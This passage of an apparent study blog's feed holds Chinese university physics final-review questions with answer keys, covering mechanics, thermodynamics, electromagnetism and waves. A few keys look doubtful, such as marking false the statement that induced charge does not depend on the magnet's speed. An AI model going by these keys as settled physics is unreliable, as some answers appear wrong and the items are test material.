class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考2.2.3）作用在定轴转动刚体上的合力矩为零，刚体转动的角速度也为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>作用在定轴转动刚体上的合力矩为零，刚体转动的角加速度也为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考2.5）平行于转轴的力对转轴的力矩一定等于零，而垂直与转轴的力对转轴的力矩一定不为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考3.2.1）当容器内部各部分的压强相等时，系统处于平衡态<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考3.2.2）若容器内各部分的温度相同，则相同处于平衡态<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考3.2.3）容器内各部分的压强相等，并且容器内各部分分子数密度也相同，则系统处于平衡态<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>温度和体积均相同的氧气和氮气具有相同的分子平均平动动能<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考3.7）$1mol$氢气与$1mol$氦气具有相同的内能<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考4.1）系统含有热量即系统含有功<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考4.3）系统吸收了热量，其内能必然增加了<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>系统对外做功其内能必然减少<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考4.10）绝热压缩气体，其内能一定增加<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考4.11）系统的温度升高一定是吸收了热量<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>热量会自动地从高温物体传到低温物体，也可以自动地从低温物体传到高温物体<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考5.1.1）两个完全相同的均匀带电小球分别带电荷量$q_1=2C$(正电荷)，$q_2=4C$(负电荷)，在真空中相距为r且静止，相互作用的静电力为F。当$q_1,q_2,r$都加倍时，作用力不变<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>在真空中相距为$r$且静止，相互作用的静电力为$F$，若两个小球的带电量都增加一倍，则它们之间的力也增加一倍<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考5.7）静电场中的零电势可以随意选择<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>如果通过一个闭合曲面的电场强度通量为0，那么该曲面上的电场强度处处为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考5.6）在电场中，电场强度为零的点，电势也为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考5.6）在静电场中，电势为零的点电场强度也一定为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考6.7）在匀强磁场中，面积相同、通有相同电流的的线圈，它们的磁矩也相等<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考7.1）感应电动势的大小取决于磁场强度<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>感应电荷量与穿过闭合线圈的磁铁速度无关<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>感应电荷量大小与穿越闭合线圈的磁铁的极性无关<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>磁场中的洛伦兹力不做功<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>如图所示，当长直导线中的电流发生变化时，线圈中的感应电动势是感生电动势。</p><p><img src="https://oss.iuoyt.com/img/posts/cfe4ee4bd5da5097d764d8e5c9ea8b64-1717645771981-90.png" alt="题图"></p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></li><li><p>（思考8.1.1）当弹性小球在地面上跳动时，是一种简谐振动。<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考8.1.2）小球在光滑的球形凹槽内进行小幅度摆动时，这是一种简谐振动<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考8.6）阻尼振动也是一种周期性振动<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考8.10.1）同一波线上，相位差为$2\pi$的两个振动质元之间的距离就是在一个周期内振动所传播的距离<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考8.13）机械波可以传递能量，也可以传递动量<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li></ol><h3 id="简答题">简答题</h3><ol><li><p>（习题5.4）如图所示，在真空中有两个点电荷，$Q_1=+3.0×10^{-8}C$，$Q_2=-3.0×10^{-8}C$，两点电荷相距$0.1$m，若电场中的A点与两点电荷之间等距离且$r=0.1m$​时，则A点电场强度的大小为？</p><p><img src="https://oss.iuoyt.com/img/posts/8b82b9014a90f603d0b2f6f33a12b31bb051ed00.jpg" alt="题图"></p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>点电荷$Q_1$和$Q_2$的电场在A点的场强分别为$E_1$和$E_2$，它们大小相等，合场强$E$在$E_1$和$E_2$的夹角平分线上，平分线与$Q_1Q_2$连线平行，方向向右，合场强$E$的大小为：</p><p>$E=E_1\cos 60°+E_2\cos 60°=2E_1\cos 60°=\frac{1}{4\pi\varepsilon_0}\frac{2Q_1}{r^2}\cos 60°=2.7\times 10^4 N/C$</p>              </div>            </details></li><li><p>（思考6.6）当载流线圈（）于磁力线时，磁力矩最小？</p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>垂直</p>              </div>            </details></li><li><p>（思考8.4）振幅为$A$​的弹簧振子，当位移是振幅的一半时，它的势能占总能量的？</p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>势能占总能量的$\frac{1}{4}$</p>              </div>            </details></li><li><p>（思考8.4）振幅为$A$​的弹簧振子，当它的动能和势能相等时，振子的位移是？</p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>位移$x=\frac{\sqrt{2}}{2}A$</p>              </div>            </details></li><li><p>（习题8.1）一质点按如下规律沿x轴做简谐振动（$x=0.05\cos[4\pi(t+\frac{1}{6})]$​），则速度的最大值约为？</p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>$v_{max}=A\omega=0.05\times4\pi m/s\approx0.628m/s$</p>              </div>            </details></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学期总结 </tag>
            
            <tag> 大学物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大学物理期末复习题</title>
      <link href="/posts/7199abcd.html"/>
      <url>/posts/7199abcd.html</url>
      
        <content type="html"><![CDATA[<h2 id="质点力学与运动学">质点力学与运动学</h2><h3 id="选择题">选择题</h3><ol><li><p>一质点在平面上运动，已知质点位置矢量的表示法为$\vec{r}=at^2\vec{i}+bt^2\vec{j}$（其中a、b为常量），则该质点作（<strong>B</strong>）</p><p>A. 匀速直线运动</p><p>B. 变速直线运动</p><p>C. 抛物线运动</p><p>D. 一般曲线运动</p></li><li><p>质点做曲线运动，$\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over r}$标识位置矢量，$\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over v}$表示速度，$\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over a}$表示加速度，$S$表示路程，$a_t$表示切向加速度，下列表达式中（<strong>D</strong>）</p><p>①$\frac{dv}{dt}=a$</p><p>②$\frac{dr}{dt}=v$</p><p>③$\frac{dS}{dt}=v$</p><p>④$\left | \frac{d\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over v}}{d\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over t}}  \right | =a_t$</p><p>A. 只有①、④正确</p><p>B. 只有②正确</p><p>C. 只有②、④正确</p><p>D. 只有③正确</p></li><li><p>质量为$20g$的子弹，以$400m/s$的速率沿图示方向射入一原来静止的质量为$980g$的摆球中，摆线长度不可伸缩，子弹射入后开始与摆球一起运动的速率为（<strong>B</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/503d269759ee3d6df4f631ab53166d224f4ade9a.jpg" alt="img"></p><p>A. 2m/s</p><p>B. 4m/s</p><p>C. 7m/s</p><p>D. 8m/s</p></li><li><p>一质点在几个外力同时作用下运动时，下述哪种说法正确？（<strong>C</strong>）</p><p>A. 质点的动量改变时，质点的动能一定改变</p><p>B. 质点的动能不变时，质点的动量也一定不变</p><p>C. 外力的冲量是零，外力的功一定为零</p><p>D. 外力的功为零，外力的冲量一定为零</p></li></ol><h3 id="填空题">填空题</h3><ol><li>（习题1.1）质点x、y、z的分量形式分别为$x=R\cos\omega t,y=R\sin\omega t,z=\frac{h\omega}{2\pi}t$，其中R、h和均为大于零的常量<ul><li>则质点位矢的表达式为：$r=R\cos\omega ti+R\sin\omega tj+\frac{h\omega t}{2\pi}k$​</li><li>任意时刻质点的速度为：$v=-\omega R\sin\omega ti+R\omega\cos \omega tj+\frac{h\omega}{2\pi}k$​</li><li>任意时刻质点的加速度为：$a=-\omega^2R(\cos\omega ti+\sin \omega tj)$</li></ul></li><li>（习题1.2）已知质点的运动方程为$r=t^2i+(t-1)^2j$​（SI单位），则<ul><li>质点的运动轨迹（仅考虑t-1 s&gt;0的情况）为：$\sqrt{y}=\sqrt{x}-1$</li><li>从t=1s到t=2s质点的位移为：$\Delta r=3i+j$</li><li>t=2s时，质点的速度为：$v_{2s}=4i+2j$</li><li>t=2s时，质点的加速度为：$a_{2s}=2i+2j$</li></ul></li><li>（习题1.3）一质点做直线运动，其顺时加速度的变化规律为$a=-A\omega^2\cos \omega t$。已知$t=0$时，质点的速度和位移大小分别为$v_0=0$和$x=A$，其中$A$和$\omega$均为大于零的常量，则该质点的运动学方程为：$x=A\cos\omega t$</li><li>（习题1.9）一质量为$m$的质点在$Oxy$平面上运动，其位置矢量为$r=a\cos\omega ti+b\sin\omega tj$，其中$a,b,\omega$都是常量，则质点在任一时刻的加速度为：$a=-a\omega^2\cos\omega ti-b\omega^2\sin\omega tj=-\omega^2r$</li></ol><h3 id="判断题">判断题</h3><ol><li>（思考1.3.1）质点做圆周运动时，加速度一定垂直于速度方向，并指向圆心（✖）</li><li>（思考1.3.2）加速度始终垂直于速度，则质点一定做圆周运动（✖）</li><li>（思考1.3.3）质点在做匀速圆周运动过程中，加速度总是不变（✖）</li><li>（思考1.3.4）只有切向加速度的运动一定是直线运动（✔）</li><li>（思考1.4.1）物体运动方向总和和其所受合外力的方向相同（✖）</li><li>（思考1.4.2）物体一旦受力就会产生加速度（✖）</li><li>（思考1.4.3）物体运动的速率不变，则其所受合外力必然为零（✖）</li></ol><h2 id="刚体力学">刚体力学</h2><h3 id="选择题-2">选择题</h3><ol><li><p>有两个力作用在一个有固定转轴的刚体上，在以下说法中（<strong>B</strong>）</p><p>①这两个力都平行于轴作用时，它们对轴的合力矩一定是零</p><p>②这两个力都垂直于轴作用时，它们对轴的合力矩可能是零</p><p>③当这两个力的合力为零时，它们对轴的合力矩也一定是零</p><p>④当这两个力对轴的合力矩为零时，它们的合力也一定是零</p><p>A. ①②③④都正确</p><p>B. ①②正确，③④错误</p><p>C. 只有①时正确的</p><p>D. ①②③都正确，④错误</p></li><li><p>一轻绳绕在有水平轴的定滑轮上，滑轮的转动惯量为l，绳下端挂一物体。物体所受重力为G，滑轮的角加速度为b，若将物体去掉而以与G相等的力直接向下拉绳子，滑轮的角加速度b将（<strong>C</strong>）</p><p>A. 不变</p><p>B. 变小</p><p>C. 变大</p><p>D. 无法判断</p></li><li><p>一人造地球卫星到地球中心$O$的最大距离和最小距离分别是$R_A$和$R_B$，设卫星对应的角动量分别是$L_A$、$L_B$，动能分别是$E_{KA}$、$E_{KB}$，则应有（<strong>D</strong>）</p><p>A. $L_B&gt;L_A$，$E_{KA}&gt;E_{KB}$</p><p>B. $L_B&gt;L_A$，$E_{KA}=E_{KB}$</p><p>C. $L_B=L_A$，$E_{KA}=E_{KB}$</p><p>D. $L_B=L_A$，$E_{KA}&lt;E_{KB}$​</p></li><li><p>一圆盘正绕垂直于盘面的水平光滑固定轴$O$转动，如图射来两个质量相同，速度大小相同，方向相反并在一条直线上的子弹，子弹射入圆盘并且留在盘内，则子弹射入后的瞬间，圆盘的角速度$\omega$​将（<strong>C</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/2e9f00daa6427d28e078913525f6b03e.png" alt="题图"></p><p>A. 增大</p><p>B. 不变</p><p>C. 减小</p><p>D. 不能确定</p></li></ol><h3 id="填空题-2">填空题</h3><ol><li>（习题2.1）一个半径为$R=1m$的飞轮以1500转每分钟的转速绕垂直盘面过圆心的定轴转动，受到制动后均匀减速，经$t=50s$后停止。则<ul><li>该飞轮的角加速度为：$a=\frac{\omega-\omega_0}{t}=-\pi rad/s^2$</li><li>从制动开始到静止转过的圈数为：$N=\frac{\theta}{2\pi}=\frac{\omega_0t+\frac{1}{2}\alpha t^2}{2\pi}=625$</li><li>制动开始25s时，飞轮的角速度为：$\omega_t=\omega_0+\alpha t=25\pi rad/s$</li></ul></li><li>（习题2.6）一根质量为$m$，长度为$l$的匀质细杆AB由一摩擦力可略去的铰链悬挂于某处，现欲使细杆恰好能从竖直位置转至水平位置，则需要给细杆的初角速度应该为：$\omega_0=\sqrt{\frac{3g}{l}}$</li><li>（习题2.2）质量为$m$，长度为$l$的均匀细棒AB，其转轴到中心点$O$的距离为$\frac{l}{4}$并与棒垂直，该细棒对于该轴的转动惯量为：$I=\frac{7}{48}ml^2$</li><li>（P57）在跳水比赛中，运动员为了增加在空中的翻腾速度，他采取的方式是将身体收紧，其目的是：减小转动惯量</li></ol><h3 id="判断题-2">判断题</h3><ol><li>（思考2.1.1）内力矩不会改变刚体对某个定轴的角动量（✔）</li><li>（思考2.1.2）作用力和反作用力对同一轴的力矩之和为零（✔）</li><li>（思考2.1.3）大小相同、方向相反的两个力对同一轴的力矩之和为零（✖）</li><li>（思考2.2.1）作用在定轴转动刚体上的力越大，刚体转动的角加速度越大（✖）</li><li>（思考2.1.4）质量相等、形状和大小不同的刚体，在相同力矩的作用下，它们的角加速度一定相等（✖）</li><li>（思考2.2.2）作用在定轴转动刚体上的合力矩越大，刚体转动的角速度越大（✖）</li><li>（思考2.2.3）作用在定轴转动刚体上的合力矩为零，刚体转动的角速度也为零（✖）</li><li>作用在定轴转动刚体上的合力矩为零，刚体转动的角加速度也为零（✔）</li><li>（思考2.5）平行于转轴的力对转轴的力矩一定等于零，而垂直与转轴的力对转轴的力矩一定不为零（✖）</li></ol><h2 id="气体动理论与热力学">气体动理论与热力学</h2><h3 id="选择题-3">选择题</h3><ol><li><p>已知一定量的某种理想气体，在温度为$T_1$与$T_2$时分子最概然速率分别为$v_{p1}$和$v_{p2}$，分子速率分布函数的最大值分别为$f(v_{p1})$和$f(v_{p2})$若$T_1&gt;T_2$则（<strong>B</strong>）<br>A. $v_{p1}&gt;v_{p2},f(v_{p1})&gt;f(v_{p2})$</p><p>B. $v_{p1}&gt;v_{p2},f(v_{p1})&lt;f(v_{p2})$​</p><p>C. $v_{p1}&lt;v_{p2},f(v_{p1})&gt;f(v_{p2})$</p><p>D. $v_{p1}&lt;v_{p2},f(v_{p1})&lt;f(v_{p2})$​</p></li><li><p>置于容器内的气体，如果气体内各处压强相等，或气体内各处温度相同，则这两种情况下气体的状态（<strong>B</strong>）</p><p>A. 一定都是平衡态</p><p>B. 不一定都是平衡态</p><p>C. 前者一定是平衡态，后者一定不是平衡态</p><p>D. 后者一定时平衡态，前者一定不是平衡态</p></li><li><p>如图所示，一定量理想气体从体积$V_1$，膨胀到体积$V_2$分别经历的过程是：$A\to B$等压过程，$A\to C$等温过程，$A\to D$绝热过程，其中吸热量最多的过程（<strong>A</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/14c01f1f8b1a632a3a08563ab7bd4798.png" alt="img"></p><p>A. 是$A\to B$</p><p>B. 是$A\to C$</p><p>C. 是$A\to D$</p><p>D. 既是$A\to B$也是$A\to C$， 两过程吸热一样多</p></li><li><p>有两个相同的容器，容积固定不变，一个盛有氨气，另一个盛有氢气(看成刚性分子的理想气体)，它们的压强和温度都相等，现将$5J$的热量传给氢气，使氢气温度升高，如果使氨气也升高同样的温度，则应向氨气传递热量是（<strong>A</strong>）</p><p>A. $6J$</p><p>B. $5J$</p><p>C. $3J$</p><p>D. $2J$</p></li><li><p>关于可逆过程和不可逆过程的判断:</p><p>①可逆热力学过程一定是准静态过程.</p><p>②准静态过程一定是可逆过程.</p><p>③不可逆过程就是不能向相反方向进行的过程.</p><p>④凡有摩擦的过程,一定是不可逆过程.</p><p>以上四种判断，其中正确的是（<strong>D</strong>）</p><p>A. ①②③</p><p>B. ①②④</p><p>C. ②④</p><p>D. ①④</p></li></ol><h3 id="填空题-3">填空题</h3><ol><li><p>（习题3.1）一定质量的气体在压强保持不变的情况下，温度由$50℃$升高到$100℃$，此时体积变为原来的：$\frac{\delta V}{V_1}=\frac{373}{323}=115.5%$</p></li><li><p>（习题3.3）真空设备内部的压强为$1.013\times 10^{-10}$Pa，若系统温度为$300K$，则此时气体分子数密度为：$n=\frac{p}{kt}=\frac{1.013\times 10^{-10}}{1.38\times 10^{-23}\times 300}m^{-3}\approx 2.45\times10^{10}m^{-3}$</p></li><li><p>（习题4.1）一个打足气的自行车内胎，若在$7.0℃$时轮胎中空气的压强为$4.0\times 10^5$Pa，则在温度变为$37℃$时，轮胎中的空气压强为：$p_0=\frac{T_0}{T}p=\frac{310\times 4.0\times 10^5}{280}Pa\approx 4.43\times10^5Pa$</p></li><li><p>（习题4.3）气缸中贮有$2.0mol$的空气，温度为$27℃$，维持压强不变，而使空气的体积膨胀到原来的3倍，此时空气膨胀时所做的功为：$A=p(V_2-V_1)=2\nu RT_1=9.972\times10^3J$</p></li><li><p>（习题4.4）一定量的空气，吸收了$1.71\times 10^3J$的热量，并保持在$1.0\times 10^5Pa$下膨胀，体积从$1.0\times 10^{-2} m^3$增加到$1.5\times 10^{-2} m^3$，此时空气对外做功为：$A=\int pdV=p(V_2-V_1)=500J$</p></li></ol><h3 id="判断题-3">判断题</h3><ol><li><p>（思考3.2.1）当容器内部各部分的压强相等时，系统处于平衡态（✖）</p></li><li><p>（思考3.2.2）若容器内各部分的温度相同，则相同处于平衡态（✖）</p></li><li><p>（思考3.2.3）容器内各部分的压强相等，并且容器内各部分分子数密度也相同，则系统处于平衡态（✔）</p></li><li><p>温度和体积均相同的氧气和氮气具有相同的分子平均平动动能（✔）</p></li><li><p>（思考3.7）$1mol$氢气与$1mol$氦气具有相同的内能（✖）</p></li><li><p>（思考4.1）系统含有热量即系统含有功（✖）</p></li><li><p>（思考4.3）系统吸收了热量，其内能必然增加了（✖）</p></li><li><p>系统对外做功其内能必然减少（✖）</p></li><li><p>（思考4.10）绝热压缩气体，其内能一定增加（✔）</p></li><li><p>（思考4.11）系统的温度升高一定是吸收了热量（✖）</p></li><li><p>热量会自动地从高温物体传到低温物体，也可以自动地从低温物体传到高温物体（✖）</p></li></ol><h2 id="静电、电磁、稳恒">静电、电磁、稳恒</h2><h3 id="简答题">简答题</h3><ol><li><p>（习题5.4）如图所示，在真空中有两个点电荷，$Q_1=+3.0×10^{-8}C$，$Q_2=-3.0×10^{-8}C$，两点电荷相距$0.1$m，若电场中的A点与两点电荷之间等距离且$r=0.1m$​时，则A点电场强度的大小为？</p><p><img src="https://oss.iuoyt.com/img/posts/8b82b9014a90f603d0b2f6f33a12b31bb051ed00.jpg" alt="img"></p><blockquote><p>点电荷$Q_1$和$Q_2$的电场在A点的场强分别为$E_1$和$E_2$，它们大小相等，合场强$E$在$E_1$和$E_2$的夹角平分线上，平分线与$Q_1Q_2$连线平行，方向向右，合场强$E$的大小为：</p><p>$E=E_1\cos 60°+E_2\cos 60°=2E_1\cos 60°=\frac{1}{4\pi\varepsilon_0}\frac{2Q_1}{r^2}\cos 60°=2.7\times 10^4 N/C$</p></blockquote></li><li><p>（思考6.6）当载流线圈（）于磁力线时，磁力矩最小？</p><blockquote><p>垂直</p></blockquote></li></ol><h3 id="选择题-4">选择题</h3><ol><li><p>坐标原点放一正电荷$Q$，它在$P$点$(x=+1,y=0)$产生的电场强度为$E$。现在，另外有一个负电荷$-2Q$，试问应将它放在什么位置才能使$P$点的电场强度等于零?（<strong>B</strong>）</p><p>A. x轴上，且x&gt;1</p><p>B. x轴上，且-1&lt;x&lt;0</p><p>C. y轴上，且y&gt;0</p><p>D. yy&lt;0轴上，且x&gt;1</p></li><li><p>电荷$Q$被曲面$S$所包围 ， 从无穷远处引入另一点电荷$q$至曲面外一点，如图所示，则引入前后（<strong>D</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/72bc933c9fdfeca8e0b21d6a55133962.png" alt="img"></p><p>A. 曲面<em>S</em>的电场强度通量不变，曲面上各点场强不变</p><p>B. 曲面<em>S</em>的电场强度通量变化，曲面上各点场强不变</p><p>C. 曲面<em>S</em>的电场强度通量变化，曲面上各点场强变化</p><p>D. 曲面<em>S</em>的电场强度通量不变，曲面上各点场强变化</p></li><li><p>半径为$R$的“无限长”均匀带电圆柱体的静电场中各点的电场强度的大小$E$与距轴线的距离$r$的关系曲线为（<strong>B</strong>）</p><p>A. <img src="https://oss.iuoyt.com/img/posts/6624119458402abcdd0c5395e51afc6c.png" alt="img"></p><p>B. <img src="https://oss.iuoyt.com/img/posts/4e35ff5abc09dfcbf9ed8e4d28aeeb0f.png" alt="img"></p><p>C. <img src="https://oss.iuoyt.com/img/posts/851a5d9c00e39fd3d959c5db88e37d8a.png" alt="img"></p><p>D. <img src="https://oss.iuoyt.com/img/posts/103b340a50f8a37bbeb186c6fd54b337.png" alt="img"></p></li><li><p>在点电荷$+q$的电场中，若取图中$P$点处为电势零点 ， 则$M$点的电势为（<strong>D</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/950aa318927ff1bda52198e09832c895.png" alt="img"></p><p>A. $\frac{q}{4\pi \epsilon_0a} $</p><p>B. $\frac{q}{8\pi \epsilon_0a} $</p><p>C. $\frac{-q}{4\pi \epsilon_0a} $</p><p>D. $\frac{-q}{8\pi \epsilon_0a} $</p></li><li><p>半径为$r$的均匀带电球面1，带有电荷$q$，其外有一同心的半径为$R$的均匀带电球面2，带有电荷$Q$，则此两球面之间的电势差$U_1-U_2$为（<strong>A</strong>）</p><p>A. $\frac{q}{4\pi\epsilon_0}(\frac{1}{r}-\frac{1}{R})$</p><p>B. $\frac{Q}{4\pi\epsilon_0}(\frac{1}{R}-\frac{1}{r})$</p><p>C. $\frac{1}{4\pi\epsilon_0}(\frac{q}{r}-\frac{Q}{R})$</p><p>D. $\frac{q}{4\pi\epsilon_0}$</p></li><li><p>一对等量异种电荷同时在同一点射入匀强磁场。已知正、负电荷的速度大小分别为$2v$和$v$，方向都和磁场$B$垂直，则（<strong>C</strong>）</p><p>A. 正电荷先返回到出发点</p><p>B. 负电荷先返回到出发点</p><p>C. 同时返回到出发点</p><p>D. 不知道</p></li><li><p>通有电流<em>I</em>的无限长直导线有如图三种形状，则$P,Q,O$各点磁感强度的大小$B_P，B_Q，B_O$间的关系为（<strong>D</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/f010bab0cba00e81ff6d5ecbc5bf60cc.png" alt="img"></p><p>A. $B_P&gt;B_Q&gt;B_O$</p><p>B. $B_Q&gt;B_P&gt;B_O$</p><p>C. $B_Q&gt;B_O&gt;B_P$</p><p>D. $B_O&gt;B_Q&gt;B_P$</p></li><li><p>如图两个半径为<em>R</em>的相同的金属环在$a、b$两点接触(<em>ab</em>连线为环直径)，并相互垂直放置。电流$I$沿$ab$连线方向由$a$端流入，$b$端流出，则环中心$O$点的磁感强度的大小为（<strong>A</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/58e6341f316dfd977b1042652007c76a.png" alt="img"></p><p>A. 0</p><p>B. $\frac{\mu_0I}{4R} $</p><p>C. $\frac{\mu_0I}{R} $</p><p>D. $\frac{\sqrt{2}\mu_0I}{R} $</p></li><li><p>如图所示，一矩形线圈以匀速自无场区平移进入均匀磁场区，又平移穿出。在(A)、(B)、©、(D)各$I-t$曲线中哪一种符合线圈中的电流随时间的变化关系（取逆时针指向为电流正方向，且不计线圈的自感）?（<strong>D</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/664504909a32680dc5a126b61f8e7474.png" alt="img"></p><p><img src="https://oss.iuoyt.com/img/posts/217a332d3904ffe04ee36a51d79f8f72.png" alt="img"><img src="https://oss.iuoyt.com/img/posts/365c866da16ecc11369efb86cfcbb3a2.png" alt="img"><img src="https://oss.iuoyt.com/img/posts/c1c2f5bf18f9269f9ab0bff5c1b1fd4b.png" alt="img"><img src="https://oss.iuoyt.com/img/posts/afdde1d2e6140cd6fbb7610d599fdce5.png" alt="img"></p></li></ol><h3 id="填空题-4">填空题</h3><ol><li><p>（习题5.1）在氢核（质子）与电子之间的最短距离为$5.3\times 10^{-11}m$，氢核与电子之间的静电力大小为：$F=\frac{1}{4\pi\varepsilon _0}\frac{q_1q_2}{r^2}=8.2\times 10^{-8}N$</p></li><li><p>（习题5.2）如图，真空中的三个点电荷，它们固定在边长为50cm的等边三角形的三个定点上，每个电荷的电荷量都是$2\times 10^{-6}C$，每个电荷所受到的静电力大小均为：$F=2F_1\cos 30°=2\times \frac{1}{4\pi\varepsilon_0}\frac{q^2}{r^2}=0.25N$</p><p><img src="https://oss.iuoyt.com/img/posts/5599ecd6c68f38da29422892076e9b1c.png" alt="img"></p></li><li><p>（习题5.5）两个带等量异号电荷的无限大平行平面，电荷的面密度为$\sigma$，则它们之间的电场强度大小为：$E=\frac{\sigma}{2\varepsilon_0}+\frac{\sigma}{2\varepsilon_0}=\frac{\sigma}{\varepsilon_0}$</p></li><li><p>（习题5.10）一根长为L的细棒，被弯成半圆形，其上均匀带电，电荷线密度为$+\lambda$，则圆心处的电势为：$V=\int \mathrm{d}V=\int_{0}^{L} \frac{\lambda \mathrm{d}l}{4\pi\varepsilon_0R}=\frac{\lambda L}{4\pi\varepsilon_0R}=\frac{\lambda} {4\varepsilon_0}$</p></li><li><p>（习题5.13）半径为R的均匀带电球面至于真空中，其电荷面密度为$\sigma$，则球面内的电场强度为：0</p></li><li><p>（思考6.1）在磁感强度为$B$的匀强磁场中，作一个半径为$r$的半球面$S$，$S$的边线所在的平面的法线方向单位矢量$e_n$与$B$之间的夹角为$\alpha$，则通过半球面$S$的磁通量为：$\int\limits_{S}B\cdot\mathrm{d}S=-\pi r^2B\cos \alpha $</p></li><li><p>当电子沿着【垂直】方向射入匀强磁场中，它所受的磁场力最大</p></li><li><p>（思考6.4）若一电子以速度$v$射入磁感应强度为$B$的匀强磁场中，当射入方向【平行】于磁场时，其不受磁场力的作用。</p></li><li><p>（思考6.6）当载流线圈【平行】于磁力线时，磁力矩最大。</p></li><li><p>（思考7.1）感应电动势的大小取决于【磁通量对时间的变化率】</p></li><li><p>如图所示，当长直导线中的电流逐渐变大时，线圈中的感应电流方向是【逆时针】</p><p><img src="https://oss.iuoyt.com/img/posts/cfe4ee4bd5da5097d764d8e5c9ea8b64.png" alt="img"></p></li><li><p>当导体线圈切割磁力线时，所产生的感应电动势是【动生电动势】</p></li></ol><h3 